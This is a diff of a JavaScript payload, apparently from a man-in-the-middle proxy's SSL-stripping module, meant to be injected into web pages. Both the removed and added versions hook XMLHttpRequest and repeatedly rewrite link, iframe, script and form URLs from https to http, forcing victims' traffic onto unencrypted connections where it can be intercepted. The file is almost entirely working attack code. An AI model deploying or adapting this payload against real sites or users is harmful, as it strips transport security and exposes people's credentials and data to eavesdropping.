@@ -1,26 +1,68 @@
-(function() {
-	var obf_open_399385 = XMLHttpRequest.prototype.open;
-	XMLHttpRequest.prototype.open = function(obf_var_method_399385, obf_var_url_399385, obf_var_async_399385, obf_var_username_399385, obf_var_password_399385) {
-		obf_var_url_399385 = obf_var_url_399385.replace(/(http)s/ig, "$1");
-		return obf_open_399385.apply(this, arguments);
-	}
-})();
+/*
+  Hooks XMLHttpRequest as well as 'a', 'form', 'script' & 'iframe' nodes.
 
-function obf_func_attack_399385() {
-	document.querySelectorAll("a,iframe,script,form").forEach(function(obf_var_node_399385){
-		switch (obf_var_node_399385.tagName) {
-			case "A": obf_var_node_399385.href && obf_var_node_399385.href.match(/https/i) ? obf_var_node_399385.href = obf_var_node_399385.href.replace(/(http)s/ig, "$1") : ""; break;
-			case "IFRAME": obf_var_node_399385.src && obf_var_node_399385.src.match(/https/i) ? obf_var_node_399385.src = obf_var_node_399385.src.replace(/(http)s/ig, "$1") : ""; break;
-			case "SCRIPT": obf_var_node_399385.src && obf_var_node_399385.src.match(/https/i) ? obf_var_node_399385.src = obf_var_node_399385.src.replace(/(http)s/ig, "$1") : ""; break;
-			case "FORM": obf_var_node_399385.action && obf_var_node_399385.action.match(/https/i) ? obf_var_node_399385.action = obf_var_node_399385.action.replace(/(http)s/ig, "$1") : ""; break;
-		}
-	});
+  Remember that any occurrence of 'obf_path_ssl_log', 'obf_path_callback' and
+  'obf_path_whitelist' in this payload will be replaced when the proxy module
+  loads and that variable names 'obf_var_target_hosts' and 'obf_var_replacement_hosts'
+  are already declared before this is injected.
+*/
+
+var obf_func_open = XMLHttpRequest.prototype.open;
+
+function obf_func_hook_XMLHttpRequest() {
+  XMLHttpRequest.prototype.open = function(
+    obf_var_method,
+    obf_var_url,
+    obf_var_async,
+    obf_var_username,
+    obf_var_password
+  ) {
+    obf_var_url = obf_var_url.replace(/(http)s/ig, "$1");
+    return obf_func_open.apply(this, arguments);
+  }
 }
 
-setInterval(obf_func_attack_399385, 666);
+function obf_func_hook_nodes() {
+  document.querySelectorAll("a,iframe,script,form").forEach(function(obf_var_node){
+    try {
+      switch (obf_var_node.tagName) {
+        case "A":
+          if (obf_var_node.href && obf_var_node.href.match(/https/i)) {
+            obf_var_node.href = obf_var_node.href.replace(/(http)s/ig, "$1");
+          }
+          break;
+        case "IFRAME":
+          if (obf_var_node.src && obf_var_node.src.match(/https/i)) {
+            obf_var_node.src = obf_var_node.src.replace(/(http)s/ig, "$1");
+          }
+          break;
+        case "SCRIPT":
+          if (obf_var_node.src && obf_var_node.src.match(/https/i)) {
+            obf_var_node.src = obf_var_node.src.replace(/(http)s/ig, "$1");
+          }
+          break;
+        case "FORM":
+          if (obf_var_node.action && obf_var_node.action.match(/https/i)) {
+            obf_var_node.action = obf_var_node.action.replace(/(http)s/ig, "$1");
+          }
+          break;
+      }
+    } catch(obf_var_ignore) {}
+  });
+}
 
 try {
-	document.addEventListener("DOMContentLoaded", obf_func_attack_399385);
-} catch(obf_ignore_399385) {
-	self.addEventListener("load", obf_func_attack_399385);
-}
+  obf_func_hook_XMLHttpRequest();
+} catch(obf_var_ignore) {}
+
+try {
+  obf_func_hook_nodes();
+} catch(obf_var_ignore) {}
+
+try {
+  obf_func_hook_XMLHttpRequest();
+  document.addEventListener("DOMContentLoaded", obf_func_hook_nodes);
+  self.addEventListener("load", obf_func_hook_nodes);
+  setInterval(obf_func_hook_nodes, 4000);
+} catch(obf_var_ignore) {}
+
